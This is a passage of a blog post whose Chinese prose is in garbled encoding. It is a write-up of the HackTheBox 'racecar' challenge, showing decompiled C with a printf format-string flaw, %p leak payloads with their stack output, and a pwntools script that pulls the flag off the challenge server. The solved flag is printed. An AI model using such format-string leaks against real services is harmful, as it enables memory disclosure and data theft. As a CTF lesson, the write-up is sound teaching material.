<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">stream = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( !stream )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s[-] Could not open flag.txt. Please contact the creator.\n&quot;</span>, <span class="string">&quot;\x1B[1;31m&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">105</span>);</span><br><span class="line">&#125;</span><br><span class="line">fgets(v13, <span class="number">44</span>, stream);</span><br><span class="line">read(<span class="number">0</span>, buf, <span class="number">0x170</span>u);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;\n\x1B[3mThe Man, the Myth, the Legend! The grand winner of the race wants the whole world to know this: \x1B[0m&quot;</span>);</span><br><span class="line">result = <span class="built_in">printf</span>((<span class="type">const</span> <span class="type">char</span> *)buf);</span><br></pre></td></tr></table></figure>
<p>flagæ­¤æ—¶è¢«ç”¨fgetsè¢«å†™åˆ°v13ä¸Šäº†ï¼Œä¹Ÿå°±æ˜¯v13å°±æ˜¯flagçš„å†…å®¹ã€‚çœ‹åˆ°ä¸‹é¢çš„printfå‡½æ•°äº†å—ï¼Œæˆ‘ä»¬åŸºæœ¬ä¸Šå¯ä»¥çŒœæµ‹å‡ºè¿™æ˜¯ä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚<br>æŸ¥çœ‹æ ˆï¼Œå‘ç°æˆ‘ä»¬è¾“å…¥çš„coinså’Œv13è²Œä¼¼åœ¨åŒä¸€ä¸ªæ ˆä¸Šã€‚</p>
<h3 id="éªŒè¯çŒœæƒ³"><a href="#éªŒè¯çŒœæƒ³" class="headerlink" title="éªŒè¯çŒœæƒ³"></a>éªŒè¯çŒœæƒ³</h3><p>æˆ‘ä»¬åœ¨ä¸‹è½½çš„ELFç¨‹åºä¸‹åˆ›å»ºä¸€ä¸ªflag.txtï¼Œé‡Œé¢çš„å†…å®¹æˆ‘ä»¬è¾“å…¥â€œAAAAâ€ï¼Œåå…­è¿›åˆ¶çš„â€œAAAAâ€çš„å€¼ä¸º0X41414141ï¼Œæ›´å®¹æ˜“ç»™æˆ‘ä»¬å‘ç°ã€‚<br>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æˆ‘è¿™é‡Œä¸åšè¿‡å¤šçš„èµ˜è¿°ï¼Œå› ä¸ºæˆ‘ä¹Ÿè®²çš„ä¸æ˜¯å¾ˆæ˜ç™½ï¼Œæ€»ä¹‹åœ¨æˆ‘ä»¬é¢å¯¹printfï¼Œsprintfå’Œvsprintfçš„æ—¶å€™ï¼Œæˆ‘ä»¬å°±æ”¹è­¦è§‰èµ·æ¥äº†ï¼Œè¿™å¾ˆæœ‰å¯èƒ½æ˜¯ä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚(printfå®¶æ—å¯çœŸæ˜¯å±é™©å•Šï¼)<br>æˆ‘ä»¬ä½¿ç”¨æˆ‘ä»¬çš„æœ‰æ•ˆpayload %p â€”è¿™ç©æ„å¯ä»¥æ›¿æ¢ä¸ºå‚æ•°çš„å€¼ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬è¾“å…¥å¤šä¸ª%pï¼Œåº”è¯¥å¯ä»¥åœ¨è¿™é‡Œçœ‹åˆ°æˆ‘ä»¬çš„flag(AAAA)çš„åå…­è¿›åˆ¶çš„å½¢å¼ã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[!] Do you have anything to say to the press after your big victory?         </span><br><span class="line">&gt; %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p</span><br><span class="line"></span><br><span class="line">The Man, the Myth, the Legend! The grand winner of the race wants the whole world to know this: </span><br><span class="line">0x57e6e200 0x170 0x565a0dfa 0xc 0x1 0x26 0x2 0x1 0x565a196c 0x57e6e200 0x57e6e380 0x41414141 0x565a000a 0xf7deced5 0x3c60a200 0x565a1d58 0x565a3f8c 0xffd2ddc8 0x565a138d 0x565a1540 0x57e6e1a0 0x2 0x3c60a200 0xf7f873fc 0x565a3f8c 0xffd2dde8 0x565a1441 0x1 0xffd2dea4 0xffd2deac 0x3c60a200</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ç¬¬12ä¸ªå‚æ•°ä¸º0x41414141ï¼Œä¹Ÿå°±æ˜¯åç§»é‡ä¸º11ã€‚<br>è®°å¾—å—ï¼Ÿæˆ‘ä»¬åœ¨ä¸Šé¢è¯´åˆ°è¿‡ï¼šflagè¢«ç”¨fgetsè¢«å†™åˆ°v13ä¸Šäº†ã€‚<br>è€Œv13çš„é•¿åº¦ä¸º44ï¼Œæ¯ä¸ªåå…­è¿›åˆ¶å¯¹åº”äº†4ä¸ªå­—èŠ‚çš„å­—ç¬¦ã€‚ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬çš„flagå äº† 44&#x2F;4 &#x3D; 11 ä¸ªåå…­è¿›åˆ¶ã€‚å³ä»ç¬¬12ä¸ªåå…­è¿›åˆ¶åˆ°ç¬¬22ä¸ªåå…­è¿›åˆ¶å°±æ˜¯æˆ‘ä»¬çš„flagäº†ã€‚<br>é‚£ä¹ˆæˆ‘ä»¬è¿æ¥åˆ°æœåŠ¡å™¨æ‰“å‡º22ä¸ªä»¥ä¸Šçš„%p</p>
<figure class="highlight nc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[!] <span class="keyword">Do</span> you have a<span class="symbol">nything to say to the press after your big victory?         </span></span><br><span class="line"><span class="symbol">&gt; %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p</span></span><br><span class="line"><span class="symbol"></span></span><br><span class="line"><span class="symbol">The Man, the Myth, the Legend! The grand winner of the race wants the whole world to know this: </span></span><br><span class="line"><span class="symbol">0</span>x<span class="number">568</span>c<span class="number">51</span>c<span class="number">0</span> <span class="number">0</span>x<span class="number">170</span> <span class="number">0</span>x<span class="number">56595</span>dfa <span class="number">0</span>x<span class="number">21</span> <span class="number">0</span>x<span class="number">9</span> <span class="number">0</span>x<span class="number">26</span> <span class="number">0</span>x<span class="number">2</span> <span class="number">0</span>x<span class="number">1</span> <span class="number">0</span>x<span class="number">5659696</span>c <span class="number">0</span>x<span class="number">568</span>c<span class="number">51</span>c<span class="number">0</span> <span class="number">0</span>x<span class="number">568</span>c<span class="number">5340</span> <span class="number">0</span>x<span class="number">7</span>b<span class="number">425448</span> <span class="number">0</span>x<span class="number">5</span>f<span class="number">796877</span> <span class="number">0</span>x<span class="number">5</span>f<span class="number">643164</span> <span class="number">0</span>x<span class="number">34735</span>f<span class="number">31</span> <span class="number">0</span>x<span class="number">745</span>f<span class="number">3376</span> <span class="number">0</span>x<span class="number">665</span>f<span class="number">3368</span> <span class="number">0</span>x<span class="number">5</span>f<span class="number">67346</span>c <span class="number">0</span>x<span class="number">745</span>f<span class="number">6</span>e<span class="number">30</span> <span class="number">0</span>x<span class="number">355</span>f<span class="number">3368</span> <span class="number">0</span>x<span class="number">6</span>b<span class="number">633474</span> <span class="number">0</span>x<span class="number">7</span>d<span class="number">213</span>f <span class="number">0</span>xe<span class="number">4287800</span> <span class="number">0</span>xf<span class="number">7</span>fba<span class="number">3</span>fc <span class="number">0</span>x<span class="number">56598</span>f<span class="number">8</span>c <span class="number">0</span>xff<span class="number">889148</span> <span class="number">0</span>x<span class="number">56596441</span> <span class="number">0</span>x<span class="number">1</span> <span class="number">0</span>xff<span class="number">8891</span>f<span class="number">4</span> <span class="number">0</span>xff<span class="number">8891</span>fc <span class="number">0</span>xe<span class="number">4287800</span> <span class="number">0</span>xff<span class="number">889160</span> <span class="comment">(nil)</span> <span class="comment">(nil)</span> <span class="number">0</span>xf<span class="number">7</span>dfdf<span class="number">21</span> <span class="number">0</span>xf<span class="number">7</span>fba<span class="number">000</span> <span class="number">0</span>xf<span class="number">7</span>fba<span class="number">000</span> <span class="comment">(nil)</span> <span class="number">0</span>xf<span class="number">7</span>dfdf<span class="number">21</span> <span class="number">0</span>x<span class="number">1</span> <span class="number">0</span>xff<span class="number">8891</span>f<span class="number">4</span> <span class="number">0</span>xff<span class="number">8891</span>fc <span class="number">0</span>xff<span class="number">889184</span> <span class="number">0</span>x<span class="number">1</span> <span class="number">0</span>xff<span class="number">8891</span>f<span class="number">4</span> <span class="number">0</span>xf<span class="number">7</span>fba<span class="number">000</span></span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œæˆ‘ä»¬ä¼šå‘ç°å­˜åœ¨ä½å­—èŠ‚åºå’Œé«˜å­—èŠ‚åºç›¸äº’è½¬æ¢çš„é—®é¢˜ï¼Œè¯´ç™½äº†å°±æ˜¯æŠŠæ¯ä¸€æ®µå€’è¿‡æ¥è¯»ã€‚<br>ç¬¬12ä¸ªæ˜¯0x7b425448ï¼Œå¯¹åº”çš„ASIIç æ˜¯{BTHï¼Œ<br>ç¬¬13ä¸ªæ˜¯0x5f796877ï¼Œå¯¹åº”çš„ASIIç æ˜¯_yhw,<br>ç¬¬14ä¸ªæ˜¯0x5f643164ï¼Œå¯¹åº”çš„ASIIç æ˜¯_d1d,<br>æ²¡é”™ï¼Œåˆ°è¿™é‡Œæˆ‘ä»¬å¯ä»¥å¯¹è¿™å¯¹ç…§è¡¨ç¡¬ç¼–æŠŠFlagç¼–å‡ºæ¥äº†ã€‚<br>ä½†æ˜¯è¿™ä¸å°±å¤ªè ¢äº†å—ï¼Ÿ</p>
<h3 id="ç¼–å†™POC"><a href="#ç¼–å†™POC" class="headerlink" title="ç¼–å†™POC"></a>ç¼–å†™POC</h3><p>æˆ‘ä»¬å¾—å…ˆè·³è¿‡å‰é¢é€‰è½¦é€‰è·‘é“çš„ç¯èŠ‚ï¼Œèµ¢å¾—è¿™åœºæ¯”èµ›ï¼</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>,<span class="number">23</span>):</span><br><span class="line">	payload += <span class="string">&quot;%&quot;</span> +<span class="built_in">str</span>(i) + <span class="string">&quot;$p &quot;</span></span><br><span class="line">r = remote(<span class="string">&quot;178.62.5.219&quot;</span>, <span class="number">30675</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;Name: &quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;Nickname: &quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;&gt; &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;&gt; &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;&gt; &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;&gt; &quot;</span>, payload)</span><br><span class="line">r.recv()</span><br><span class="line">response = r.recv()</span><br><span class="line"><span class="built_in">print</span>(response)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿˜è®°å¾—å—ï¼Œè¾“å‡ºçš„responseä¸­ï¼Œä¼šå¸¦æœ‰ç”¨æ¥ä¿®é¥°å­—ç¬¦ä¸²çš„â€\x1b[0m\nâ€ã€‚<br>æˆ‘ä»¬å¾—æƒ³åŠæ³•æŠŠå®ƒå»æ‰ï¼Œç»™responseæçº¯ã€‚è¿™é‡Œç”¨split()æ–¹æ³•ï¼Œå…ˆæŠŠå‰é¢çš„â€\x1b[0m\nâ€å»æ‰ï¼Œç„¶åæŠŠæ¯ä¸€ä¸ª</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#ä»¥&quot;m\n&quot;ä¸ºåˆ†éš”ç¬¦æŠŠresponseåˆ†å‰²ï¼Œå–åˆ‡ç‰‡[1]ï¼Œè¯´ç™½äº†å°±æ˜¯æŠŠ&quot;\x1b[0m\n&quot;å»æ‰</span></span><br><span class="line">array = (response.decode(<span class="string">&quot;utf-8&quot;</span>).split(<span class="string">&quot;m\n&quot;</span>))[<span class="number">1</span>]</span><br><span class="line"><span class="comment">#åˆ†å‰²æ¯ä¸€ä¸ªåå…­è¿›åˆ¶ï¼Œæ‹¼æˆä¸€ä¸ªæ•°ç»„  </span></span><br><span class="line">array = array.split()</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment">#éå†æ•°ç»„ï¼Œå°†å…¶è½¬ä¸ºutf-8ã€‚</span></span><br><span class="line"><span class="comment">#p32() å¯ä»¥è®©æˆ‘ä»¬è½¬æ¢æ•´æ•°åˆ°å°ç«¯åºæ ¼å¼</span></span><br><span class="line"><span class="comment">###è¿™é‡Œæˆ‘æœ‰è¸©å‘ï¼Œutf-8è½¬ç æ—¶æŠ¥é”™äº†ï¼ŒæŸ¥è¯¢åå‘ç°äº†é—®é¢˜</span></span><br><span class="line"><span class="comment">###å‡ºç°å¼‚å¸¸æŠ¥é”™æ˜¯ç”±äºè®¾ç½®äº†decode()æ–¹æ³•çš„ç¬¬äºŒä¸ªå‚æ•°errorsä¸ºä¸¥æ ¼ï¼ˆstrictï¼‰å½¢å¼é€ æˆçš„ï¼Œå› ä¸ºdecode()æ–¹æ³•é»˜è®¤strictï¼Œåªè¦å°†å…¶æ›´æ”¹ä¸ºignoreç­‰å³å¯ã€‚</span></span><br><span class="line"><span class="comment">#ä½†æ˜¯è¿™ä¸ªé”™è¯¯åªä¼šåœ¨æœ¬åœ°è¿è¡Œracecaræ—¶æŠ¥é”™ï¼Œåœ¨HTBæœåŠ¡å™¨ä¸Šå°±ä¸ä¼šï¼ˆ</span></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> array:</span><br><span class="line">    flag += p32(<span class="built_in">int</span>(char, <span class="number">16</span>)).decode(<span class="string">&quot;utf-8&quot;</span>,<span class="string">&quot;ignore&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<h3 id="PWN-â€“-GET-FLAG"><a href="#PWN-â€“-GET-FLAG" class="headerlink" title="PWN â€“ GET FLAG"></a>PWN â€“ GET FLAG</h3><p>è¿è¡Œæˆ‘ä»¬çš„payloadã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">â”€<span class="comment"># python3 payload.py</span></span><br><span class="line">[+] Opening connection to 178.62.5.219 on port 30675: Done</span><br><span class="line">/home/kali/Desktop/payload.py:7: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/<span class="comment">#bytes</span></span><br><span class="line">  r.sendlineafter(<span class="string">&quot;Name: &quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">/usr/local/lib/python3.10/dist-packages/pwnlib/tubes/tube.py:822: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/<span class="comment">#bytes</span></span><br><span class="line">  res = self.recvuntil(delim, <span class="built_in">timeout</span>=<span class="built_in">timeout</span>)</span><br><span class="line">/home/kali/Desktop/payload.py:8: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/<span class="comment">#bytes</span></span><br><span class="line">  r.sendlineafter(<span class="string">&quot;Nickname: &quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">/home/kali/Desktop/payload.py:9: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/<span class="comment">#bytes</span></span><br><span class="line">  r.sendlineafter(<span class="string">&quot;&gt; &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">/home/kali/Desktop/payload.py:10: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/<span class="comment">#bytes</span></span><br><span class="line">  r.sendlineafter(<span class="string">&quot;&gt; &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">/home/kali/Desktop/payload.py:11: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/<span class="comment">#bytes</span></span><br><span class="line">  r.sendlineafter(<span class="string">&quot;&gt; &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">/home/kali/Desktop/payload.py:12: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/<span class="comment">#bytes</span></span><br><span class="line">  r.sendlineafter(<span class="string">&quot;&gt; &quot;</span>, payload)</span><br><span class="line">b<span class="string">&#x27;\n\x1b[3mThe Man, the Myth, the Legend! The grand winner of the race wants the whole world to know this: \x1b[0m\n0x7b425448 0x5f796877 0x5f643164 0x34735f31 0x745f3376 0x665f3368 0x5f67346c 0x745f6e30 0x355f3368 0x6b633474 0x7d213f \n&#x27;</span></span><br><span class="line">HTB&#123;why_d1d_1_s4v3_th3_fl4g_0n_th3_5t4ck?!&#125;\x00</span><br><span class="line">[*] Closed connection to 178.62.5.219 port 30675</span><br></pre></td></tr></table></figure>
<p>æˆåŠŸå–å¾—FLAGï¼š<br>HTB{why_d1d_1_s4v3_th3_fl4g_0n_th3_5t4ck?!}</p>
<p>åˆ°è¿™é‡Œè¿™é¢˜å°±ç»“æŸäº†ï¼Œç¬¬ä¸€æ¬¡å†™WPï¼Œå¯èƒ½æœ‰äº›åœ°æ–¹ä¼šæœ‰äº›é—®é¢˜ã€‚è™½è¯´æ˜¯ç®€å•çš„PWNé¢˜ï¼Œä½†ä¹ŸèŠ±äº†æˆ‘ä¸å°‘æ—¶é—´ï¼Œæœ‰ç§è±ç„¶å¼€æœ—çš„æ„Ÿè§‰ã€‚</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">æ–‡ç« ä½œè€…: </span><span class="post-copyright-info"><a href="http://example.com">ã¿ã‚„ã¯ã— ã‚Šã‚‡ã†</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">æ–‡ç« é“¾æ¥: </span><span class="post-copyright-info"><a href="http://example.com/yui/4f65e8bd.html">http://example.com/yui/4f65e8bd.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">ç‰ˆæƒå£°æ˜: </span><span class="post-copyright-info">æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜æ¥è‡ª <a href="http://example.com" target="_blank">ã¿ã‚„ã¯ã— ã‚Šã‚‡ã† çš„ Reality marble</a>ï¼</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/PWN/">PWN</a></div><div class="post_share"><div class="social-share" data-image="/img/daliy.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/yui/16107.html"><img class="next-cover" src="/img/daliy.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">ä¸‹ä¸€ç¯‡</div><div class="next_info">æµ‹è¯•æ–‡ä»¶</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/qigong.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">ã¿ã‚„ã¯ã— ã‚Šã‚‡ã†</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">æ–‡ç« </div><div class="length-num">2</div></a><a href="/tags/"><div class="headline">æ ‡ç­¾</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">åˆ†ç±»</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Yui-97"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/Yui-97" target="_blank" title="Github"><i class="fab fa-github"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>å…¬å‘Š</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>ç›®å½•</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%A6%82%E6%8B%AC%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">é¢˜ç›®æ¦‚æ‹¬ï¼š</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%B9%E6%96%87%E4%BB%B6%E8%BF%9B%E8%A1%8C%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">å¯¹æ–‡ä»¶è¿›è¡Œåˆ†æ</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C%E6%96%87%E4%BB%B6"><span class="toc-number">2.1.</span> <span class="toc-text">è¿è¡Œæ–‡ä»¶</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IDA%E5%8F%8D%E7%BC%96%E8%AF%91%E5%88%86%E6%9E%90"><span class="toc-number">2.2.</span> <span class="toc-text">IDAåç¼–è¯‘åˆ†æ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81%E7%8C%9C%E6%83%B3"><span class="toc-number">2.3.</span> <span class="toc-text">éªŒè¯çŒœæƒ³</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E5%86%99POC"><span class="toc-number">2.4.</span> <span class="toc-text">ç¼–å†™POC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PWN-%E2%80%93-GET-FLAG"><span class="toc-number">2.5.</span> <span class="toc-text">PWN â€“ GET FLAG</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>æœ€æ–°æ–‡ç« </span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/yui/4f65e8bd.html" title="HackTheBox racecar --WP"><img src="/img/daliy.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HackTheBox racecar --WP"/></a><div class="content"><a class="title" href="/yui/4f65e8bd.html" title="HackTheBox racecar --WP">HackTheBox racecar --WP</a><time datetime="2022-12-05T16:58:17.000Z" title="å‘è¡¨äº 2022-12-06 00:58:17">2022-12-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/yui/16107.html" title="æµ‹è¯•æ–‡ä»¶"><img src="/img/daliy.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="æµ‹è¯•æ–‡ä»¶"/></a><div class="content"><a class="title" href="/yui/16107.html" title="æµ‹è¯•æ–‡ä»¶">æµ‹è¯•æ–‡ä»¶</a><time datetime="2022-12-05T05:54:20.179Z" title="å‘è¡¨äº 2022-12-05 13:54:20">2022-12-05</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By ã¿ã‚„ã¯ã— ã‚Šã‚‡ã†</div><div class="framework-info"><span>æ¡†æ¶ </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>ä¸»é¢˜ </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="é˜…è¯»æ¨¡å¼"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="æµ…è‰²å’Œæ·±è‰²æ¨¡å¼è½¬æ¢"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="å•æ å’ŒåŒæ åˆ‡æ¢"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="è®¾ç½®"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="ç›®å½•"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="å›åˆ°é¡¶éƒ¨"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>